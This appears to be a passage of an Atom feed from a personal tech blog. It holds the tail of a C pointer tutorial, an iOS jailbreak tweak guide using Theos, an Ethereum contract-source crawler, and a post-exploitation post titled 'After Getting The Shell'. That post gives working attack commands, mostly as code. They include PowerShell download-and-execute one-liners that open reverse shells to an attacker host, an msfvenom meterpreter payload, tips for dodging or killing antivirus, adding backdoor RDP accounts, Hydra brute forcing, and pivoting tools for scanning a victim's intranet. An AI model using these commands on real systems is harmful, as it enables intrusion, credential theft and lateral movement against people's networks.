class="keyword">if</span> (<span class="built_in">queue</span>-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">queue</span>-&gt;tail = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(ptmp);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s review the code of <em>binarytree.c</em> and replace the function <em>binarytree_create</em> by <em>binarytree_create2</em>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">binarytree_create2</span><span class="params">(Tree *Root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n输入节点数值((当输入为100时，当前节点创建完成))):"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line">Root = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Root = (Tnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Tnode));</span><br><span class="line"><span class="keyword">if</span> (Root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Root-&gt;data = a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n create %d 的左孩子:"</span>,a);</span><br><span class="line">binarytree_create(Root-&gt;lchild);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n create %d 的右孩子:"</span>,a);</span><br><span class="line">binarytree_create(Root-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binarytree_create(root);</span><br></pre></td></tr></table></figure><p>Is that right? definitely not. The code can be surely compiled successfully, but the procedure will stop at function <em>binarytree_preorder</em>. Remember? The pointer cannot be directly passed as an argument if there will be memory allocation to the pointer later. the original pointer will always stay NULL. In addition, remember to free memory in each example to avoid memory leaks if I didn’t do that.</p>]]></content>
    
    <summary type="html">
    
      I summarized a few confusing usages of pointers in C and used some code from other guys as examples.
    
    </summary>
    
    
      <category term="Programming" scheme="https://recursively.github.io/categories/Programming/"/>
    
    
      <category term="C/C++" scheme="https://recursively.github.io/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>The Experiment of Tweak for iOS</title>
    <link href="https://recursively.github.io/2018/11/20/The-Experiment-of-Tweak-for-iOS/"/>
    <id>https://recursively.github.io/2018/11/20/The-Experiment-of-Tweak-for-iOS/</id>
    <published>2018-11-20T20:34:02.000Z</published>
    <updated>2019-10-08T14:51:10.889Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Tweak-for-what"><a href="#Tweak-for-what" class="headerlink" title="Tweak for what?"></a>Tweak for what?</h2><p>You can make a choice of whatever you want to add a tweak on iOS. For me, I started with the SpringBoard of iOS. So, what is SpringBoard? SpringBoard is the application that manages the home screen on iOS devices. Essentially SpringBoard is like the mobile version of a desktop. Mac OS X features the Finder while Windows computers have the Explorer. And what does the tweak affect? This tweak works when the user triggers a respring(A respring restarts the user interface (SpringBoard) of the iOS operating system. The main difference between a restart and a respring is that a respring doesn’t switch off the system.).</p><h2 id="Get-the-environment-ready"><a href="#Get-the-environment-ready" class="headerlink" title="Get the environment ready"></a>Get the environment ready</h2><p>The framework I used during the tweak development is Theos(<a href="https://github.com/theos/theos" target="_blank" rel="noopener">https://github.com/theos/theos</a>), an efficient and powerful framework. It’s simple to clone the project and execute the <em>chmod</em> directive, so I omit that here and come to the steps different from the old version of Theos.</p><p>Install dpkg and ldid which is used to sign your package instead of codesign in Xcode.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install dpkg ldid</span><br></pre></td></tr></table></figure><p>If you don’t have Homebrew, you just need one command to get it and then you’re good to go.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"</span><br></pre></td></tr></table></figure><p>The operation of <em>sudo /opt/theos/bin/bootstrap.sh substrate</em> is not needed with the latest version of Theos. When everything is done, remember to set the<br>environment variables:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export THEOS=/opt/theos</span><br><span class="line">export PATH=/opt/theos/bin/:$PATH</span><br><span class="line">export THEOS_MAKE_PATH=$THEOS/makefiles</span><br></pre></td></tr></table></figure><p>All the preparations have been finished, we can now dive into the interesting section.</p><h2 id="Functions-hooking"><a href="#Functions-hooking" class="headerlink" title="Functions hooking"></a>Functions hooking</h2><p>I post the final result appears on my device here:<br><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/2-1.png" alt><br>Apple has given many APIs for AppStore developers, but it’s not enough compared to the mammoth APIs which can be exposed on the jailbroken device. When it comes to developing tweaks, it’s actually changing the behavior by hooking functions. But it’s not easy to find out how the functionality implemented among the code. In fact, it takes lots of time to figure out the logic of the substrate. I just implement the common work supplied by other people.</p><h3 id="Generate-a-template"><a href="#Generate-a-template" class="headerlink" title="Generate a template."></a>Generate a template.</h3><p>Type nic.pl and choose an option from the given list. We want to generate a tweak template, so input 13. Then finish the following information.<br><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/2-2.png" alt><br>When you see the output of “Done.”, there will be 4 files generated under your working directory: </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Makefile    commonproject.plist    Tweak.xm    control</span><br></pre></td></tr></table></figure><h3 id="Modify-files-as-you-need"><a href="#Modify-files-as-you-need" class="headerlink" title="Modify files as you need"></a>Modify files as you need</h3><p><em>Makefile</em> is generally used in most projects to get everything done properly. In our project, it used to point out files, libraries and frameworks we need.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">THEOS_DEVICE_IP = 10.1.2.34</span><br><span class="line">ARCHS = armv7 arm64</span><br><span class="line">TARGET = iphone:latest:8.0</span><br><span class="line">include $(THEOS)/makefiles/common.mk</span><br><span class="line"></span><br><span class="line">TWEAK_NAME = commonproject</span><br><span class="line">commonproject_FILES = Tweak.xm</span><br><span class="line">commonproject_FRAMEWORKS = UIKit</span><br><span class="line"></span><br><span class="line">include $(THEOS_MAKE_PATH)/tweak.mk</span><br><span class="line"></span><br><span class="line">after-install::</span><br><span class="line">        install.exec "killall -9 SpringBoard"</span><br></pre></td></tr></table></figure><p>We write our code about functions hooking and other useful snippets in the  <em>Tweak.xm</em> file.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span>hook SpringBoard</span><br><span class="line">  </span><br><span class="line">// Hooking an instance method with an argument.</span><br><span class="line">- (void)applicationDidFinishLaunching:(id)application &#123;</span><br><span class="line"></span><br><span class="line">        %orig; // Call through to the original function with its original arguments.</span><br><span class="line">        UIAlertView *alert = [[UIAlertView alloc]initWithTitle:@"此广告位常年招商" message:nil delegate:self cancelButtonTitle:@"OK"otherButtonTitles:nil];</span><br><span class="line">        [alert show];</span><br><span class="line">        [alert release];</span><br><span class="line"></span><br><span class="line">        // If you use %orig(), you MUST supply all arguments (except for self and _cmd, the automatically generated ones.)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Always make sure you clean up after yourself; Not doing so could have grave consequences!</span><br><span class="line"><span class="meta">%</span>end</span><br></pre></td></tr></table></figure><p>The <em>control</em> file contains the basic information of your deb package, all of them will be packed in your deb package.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Package: apple</span><br><span class="line">Name: commonproject</span><br><span class="line">Depends: mobilesubstrate</span><br><span class="line">Version: 0.0.1</span><br><span class="line">Architecture: iphoneos-arm</span><br><span class="line">Description: iOS tweak learning.</span><br><span class="line">Maintainer: z</span><br><span class="line">Author: z</span><br><span class="line">Section: Tweaks</span><br><span class="line">Homepage: http://recursively.review</span><br></pre></td></tr></table></figure><p>The *.plist file contains the configuration of your package.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; Filter = &#123; Bundles = ( "com.apple.springboard" ); &#125;; &#125;</span><br></pre></td></tr></table></figure><h3 id="Install-your-package"><a href="#Install-your-package" class="headerlink" title="Install your package"></a>Install your package</h3><p>Next, we need to install our package onto the iOS device with directive <em>make package install</em> remotely through the ssh. But firstly, you should have installed OpenSSH. You need to input your password of ssh twice during the installation process. If no errors prompt out you can respring your iOS device and easily see the result I’ve shown above.</p><h2 id="Sources"><a href="#Sources" class="headerlink" title="Sources"></a>Sources</h2><p><em>iOS App Reverse Engineering</em></p>]]></content>
    
    <summary type="html">
    
      Thanks to the release of Unc0ver suite which allows jailbreak on iOS11 and even on iOS12. I have the opportunity to try out the experiment of tweak on the iOS11 device. It&#39;s not complicated as I expected and meanwhile, interesting.
    
    </summary>
    
    
      <category term="Reverse Engineering" scheme="https://recursively.github.io/categories/Reverse-Engineering/"/>
    
    
      <category term="iOS" scheme="https://recursively.github.io/tags/iOS/"/>
    
      <category term="Theos" scheme="https://recursively.github.io/tags/Theos/"/>
    
  </entry>
  
  <entry>
    <title>After Getting The Shell</title>
    <link href="https://recursively.github.io/2018/11/02/After-Getting-The-Shell/"/>
    <id>https://recursively.github.io/2018/11/02/After-Getting-The-Shell/</id>
    <published>2018-11-02T11:55:13.000Z</published>
    <updated>2019-10-08T14:51:10.889Z</updated>
    
    <content type="html"><![CDATA[<p>Here gives two methods to trigger a windows reverse shell with PowerShell, remember to bypass the PowerShell security policy before you execute PowerShell command. (<a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/" target="_blank" rel="noopener">https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/</a>)</p><p>For attacker:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure><p>For target:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString('http://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');</span><br><span class="line">powercat -c x.x.x.x -p 6666 -e cmd</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');</span><br><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -port 6666</span><br></pre></td></tr></table></figure><p>Sometimes the protection system on the server will block PowerShell from downloading anything, there are two tools to help you:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip</span><br></pre></td></tr></table></figure><p>Most of the time you will face three situations:</p><h3 id="You-don’t-have-administrator-privilege-but-there-is-no-protection-system"><a href="#You-don’t-have-administrator-privilege-but-there-is-no-protection-system" class="headerlink" title="You don’t have administrator privilege, but there is no protection system."></a>You don’t have administrator privilege, but there is no protection system.</h3><p>If you’re lucky enough, there’s no anti-virus software in the system, you can trigger a reverse Metasploit shell in any method you like:<br>In an easy way:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; a.exe</span><br></pre></td></tr></table></figure><p>All you need to do is uploading the payload and execute it. When it comes to the question of how to upload the payload, the answer is that you must forward your local port to the public network with the help of FRP(<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a>) which is a powerful tool, and you must have a VPS to achieve that. Even if you don’t have a VPS, you can use ngrok to make it work.</p><h3 id="There-is-protection-system-in-the-server-but-you-have-administrator-privilege"><a href="#There-is-protection-system-in-the-server-but-you-have-administrator-privilege" class="headerlink" title="There is protection system in the server, but you have administrator privilege."></a>There is protection system in the server, but you have administrator privilege.</h3><p>If you’re not so lucky, maybe you should find some methods such as veil-evasion to obfuscate your payload. In worse situation, your payload which has been obfuscated was deleted by the antivirus as well. you’d better consider killing the process of the antivirus.</p><p>Sometimes it’s not easy to kill the process of antivirus, you can just log into the system by the remote desktop protocol. The first step is to add a new user to the system:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user Name Pass /add</span><br></pre></td></tr></table></figure><p>Then you should add this user to the allowed rdp accounts from the commandline:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup "Remote Desktop Users" domain\user /add</span><br></pre></td></tr></table></figure><p>If you want to add a non-domain user, it’s easier:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup "Remote Desktop Users" user /add</span><br></pre></td></tr></table></figure><p>But you cannot do crazy things with this account, but you can identify which protection system the server use and shutdown it or bypass it. It’s not done yet if you want to execute some high-privilege command, privilege escalation could be taken into consideration.</p><p>Hydra is a powerful tool if you have a powerful wordlist:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra x.x.x.x rdp -L users.txt -P wordlist.txt -v</span><br></pre></td></tr></table></figure><p>Mimikatz is also a good choice to dump the username and password from memory of the server. But most of the time mimikatz will be killed by the protection system.</p><h3 id="You-don’t-have-the-administrator-privilege-and-the-server-has-a-protection-system"><a href="#You-don’t-have-the-administrator-privilege-and-the-server-has-a-protection-system" class="headerlink" title="You don’t have the administrator privilege, and the server has a protection system."></a>You don’t have the administrator privilege, and the server has a protection system.</h3><p>Shutdown your computer and go to sleep unless you have some 0day vulnerabilities.</p><hr><p>There are some ways to help you to go deep and you can treat your victim as a pivot to find out more vulnerable hosts within the intranet.</p><p>Firstly try to add the routing rules of the target to your meterpreter shell. An msf built-in module “autoroute” and is convenient. (<a href="https://www.offensive-security.com/metasploit-unleashed/proxytunnels/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/proxytunnels/</a>)</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/1-1.png" alt></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/1-2.png" alt></p><p>You can enumerate hosts by performing an ARP scan:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner rhosts=192.168.5.1/24</span><br></pre></td></tr></table></figure><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/1-3.png" alt></p><p>Adding routing rule is not always working well, you can try the socks4a module in meterpreter:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use anxiliary/server/socks4a</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/1-4.png" alt></p><p>If it’s Linux in your local machine, you can use proxychains to set the socks5 proxy.<br>Getting proxychains installed:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install proxychains-ng</span><br></pre></td></tr></table></figure><p>Add the following content into the /etc/proxychains.conf file:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 127.0.0.1 1080</span><br></pre></td></tr></table></figure><p>Then you can use socks proxy to scan the victim’s intranet:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn --open 192.168.5.0/24</span><br></pre></td></tr></table></figure><p>I have tried so many times to find out all the machines in the victim’s intranet but I was usually failed. It just works for few times and the process is too slow. Maybe nmap is the reason for this problem, it works well when I use proxychains to get information from other hosts within the same intranet.</p><p>Or you can use EarthWorm(<a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a>) to forward the victim machine’s port to your VPS and use proxy<br>chains or proxifier in your local machine:<br>For your VPS:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 1024</span><br></pre></td></tr></table></figure><p>The command above means your VPS listens the port 1080, 1024  and waits for attacker connect to the port 1080, the victi<br>m connects to the port 1024.</p><p>For target:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew.exe -s rssocks -d x.x.x.x -e 1024</span><br></pre></td></tr></table></figure><p>The argument -d is the IP address of your VPS.</p><p>Add the following content into the /etc/proxychains.conf file:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 x.x.x.x 1080</span><br></pre></td></tr></table></figure><p>Use proxychains to scan rest of the hosts:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn -open 192.168.5.0/24</span><br></pre></td></tr></table></figure><p>Here comes the point, most of the antivirus will treat EarthWorm as the threat to the system and it will possibly be killed.</p><p>I’d like to recommend another open-source tool called ssocks.(<a href="https://github.com/tostercx/ssocks" target="_blank" rel="noopener">https://github.com/tostercx/ssocks</a>) You can build the source code by yourself.</p><p>The usage is similar to EarthWorm:</p><p>For your VPS:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rcsocks -l 1088 -p 1080 -vv</span><br></pre></td></tr></table></figure><p>For target:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rssocks -s x.x.x.x:1080 -vv</span><br></pre></td></tr></table></figure><p>The configuration and operation of proxychains is same as previous description.</p><p>If you need ports forwarding, it’s also available in meterpreter: (<a href="https://www.offensive-security.com/metasploit-unleashed/portfwd/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/portfwd/</a>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r 192.168.5.100</span><br></pre></td></tr></table></figure><p>Another popular tool is lcx.exe:<br>For attacker:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -listen 2222 3333</span><br></pre></td></tr></table></figure><p>For target:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -slave x.x.x.x 2222 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>The IP x.x.x.x is the address of your public VPS. Finally execute <strong><em>mstsc x.x.x.x:3333</em></strong> to connect to the remote desktop of the target.</p><p>There are many other useful tools except for the tools I mentioned above, such as netcat, ncat and ssf. You can make a choice among them as you like.</p>]]></content>
    
    <summary type="html">
    
      It seems that it&#39;s getting more and more popular that everyone would like to perform a scan of the whole intranet when he takes down one of the other people&#39;s machines. So what to do next after getting the shell of a windows system? Some ideas about that.
    
    </summary>
    
    
      <category term="Hacking" scheme="https://recursively.github.io/categories/Hacking/"/>
    
    
      <category term="PowerShell" scheme="https://recursively.github.io/tags/PowerShell/"/>
    
      <category term="Metasploit" scheme="https://recursively.github.io/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Smart Contract Sourcecode Crawler</title>
    <link href="https://recursively.github.io/2018/07/09/Smart-Contract-Sourcecode-Crawler/"/>
    <id>https://recursively.github.io/2018/07/09/Smart-Contract-Sourcecode-Crawler/</id>
    <published>2018-07-09T11:39:39.000Z</published>
    <updated>2019-10-08T14:51:10.889Z</updated>
    
    <content type="html"><![CDATA[<h2 id="The-method-to-crawl-the-Ethereum-blockchain"><a href="#The-method-to-crawl-the-Ethereum-blockchain" class="headerlink" title="The method to crawl the Ethereum blockchain"></a>The method to crawl the Ethereum blockchain</h2><p>The simplest way is to get all of the blocks from Etherscan.io and can save much of my local space. I’ve tried to grab all of the transactions from Etherscan.io, but my IP was banned after a few of trials. So I have to synchronize the whole node of Ethereum blockchain into my local machine. My purpose is to grab the sourcecode of the smart contract, but it’s not feasible to get the sourcecode from the bytecode itself. (Refer this question: <a href="https://ethereum.stackexchange.com/questions/26648/how-to-find-solidity-code-for-a-contract-address" target="_blank" rel="noopener">https://ethereum.stackexchange.com/questions/26648/how-to-find-solidity-code-for-a-contract-address</a>)</p><h2 id="Get-information-by-web3"><a href="#Get-information-by-web3" class="headerlink" title="Get information by web3"></a>Get information by web3</h2><p>I used the web3.eth.getCode() method to identify whether an address is a contract or not. At first, I synchronized the whole node by adding argument –fast, and I cannot get the bytecode with web3.eth.getCode(). Maybe something was missing in this way of sync. So I deleted the database and added the argument –syncmode:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --rpc --rpcaddr=127.0.0.1 --syncmode=full</span><br></pre></td></tr></table></figure><p>Then everything works well. If you don’t want to sync the node into your local disk, you can also choose the public geth node like <a href="https://infura.io/" target="_blank" rel="noopener">infura</a> to use. In addition to the large usage of disk, the sync process will get extremely slower from block #2283397 to #2700031 because of the denial of service attack on 2016/09/18. (<a href="https://github.com/ethereumbook/ethereumbook/blob/develop/clients.asciidoc" target="_blank" rel="noopener">https://github.com/ethereumbook/ethereumbook/blob/develop/clients.asciidoc</a>)</p><h2 id="Use-the-Etherscan-APIs"><a href="#Use-the-Etherscan-APIs" class="headerlink" title="Use the Etherscan APIs"></a>Use the Etherscan APIs</h2><p>Learn about how Ethereum developer APIs work: <a href="https://etherscan.io/apis" target="_blank" rel="noopener">https://etherscan.io/apis</a></p><p>There are some useful APIs, for example:</p><p>Get transaction receipt:<br><a href="https://api.etherscan.io/api?module=proxy&amp;action=eth_getTransactionReceipt&amp;txhash=0x6ed68687dc6ccc5ecd17a4842c260aab1de356fdbf2d3d7ef5f8c95f5f0d2035&amp;apikey=YourApiKeyToken" target="_blank" rel="noopener">https://api.etherscan.io/api?module=proxy&amp;action=eth_getTransactionReceipt&amp;txhash=0x6ed68687dc6ccc5ecd17a4842c260aab1de356fdbf2d3d7ef5f8c95f5f0d2035&amp;apikey=YourApiKeyToken</a></p><p>Get sourcecode:<br><a href="https://api.etherscan.io/api?module=contract&amp;action=getsourcecode&amp;address=0xc368A8E22e09CEA6e0Ca160309d94B792729892d&amp;apikey=YourApiKeyToken" target="_blank" rel="noopener">https://api.etherscan.io/api?module=contract&amp;action=getsourcecode&amp;address=0xc368A8E22e09CEA6e0Ca160309d94B792729892d&amp;apikey=YourApiKeyToken</a></p><p>I used the getsourcecode api to get the verified contract. If the contract is not verified, this api will not work. Finally, you can check the states of your API from Etherscan.io:</p><p><img src="https://media.githubusercontent.com/media/recursively/recursively.github.io/hexo/source/pics/3-1.png" alt></p><h2 id="Separate-the-blocks-into-slices"><a href="#Separate-the-blocks-into-slices" class="headerlink" title="Separate the blocks into slices"></a>Separate the blocks into slices</h2><p>The whole Ethereum blockchain contains over 5000,000 blocks, you’d better not get all of them into your computer memory. It’s not complicated to solve it, you just need to separate the blocks into slices.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">(blocklist)</span>:</span></span><br><span class="line">    transactions = []</span><br><span class="line">    <span class="comment"># blocklist = list(range(blockstart, blockend))</span></span><br><span class="line">    threadLock.acquire()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(range(blockstart, blockend)) / slice_len)):</span><br><span class="line">        threadLock.acquire()</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> blocklist[<span class="number">0</span>:slice_len]:</span><br><span class="line">            transactions += (w3.eth.getBlock(block)[<span class="string">'transactions'</span>])</span><br><span class="line">        get_addr_code(transactions)</span><br><span class="line">        <span class="keyword">del</span> blocklist[<span class="number">0</span>:slice_len]</span><br><span class="line">        transactions = []</span><br><span class="line">        threadLock.release()</span><br><span class="line">    threadLock.release()</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocklist:  <span class="comment"># go over the last slice of the blocklist</span></span><br><span class="line">        transactions += (w3.eth.getBlock(block)[<span class="string">'transactions'</span>])</span><br><span class="line">    get_addr_code(transactions)</span><br></pre></td></tr></table></figure><h2 id="Something-tricky"><a href="#Something-tricky" class="headerlink" title="Something tricky"></a>Something tricky</h2><p>I wanted to add the multiprocessing module to accelerate the crawling process, but I failed because of some strange reasons on Mac. Finally, I used the threading module to achieve that, but the result doesn’t meet my expectations.</p>]]></content>
    
    <summary type="html">
    
      Some ideas about crawling Ethereum smart contract sourcecode from the mainnet of Ethereum blockchain. Make sure you have at least 1 month to synchronize the complete blockchain node. :)
    
    </summary>
    
    
      <category term="Blockchain" scheme="https://recursively.github.io/categories/Blockchain/"/>
    
    
      <category term="Python" scheme="https://recursively.github.io/tags/Python/"/>
    
      <category term="Crawler" scheme="https://recursively.github.io/tags/Crawler/"/>
    
      <category term="Ethereum" scheme="https://recursively.github.io/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>Brief Usage of MongoDB and Elasticsearch</title>
    <link href="https://recursively.github.io/2018/07/03/Brief-Usage-of-MongoDB-and-Elasticsearch/"/>
    <id>https://recursively.github.io/2018/07/03/Brief-Usage-of-MongoDB-and-Elasticsearch/</id>
    <published>2018-07-03T15:36:24.000Z</published>
    <updated>2019-10-08T14:51:10.889Z</updated>
    
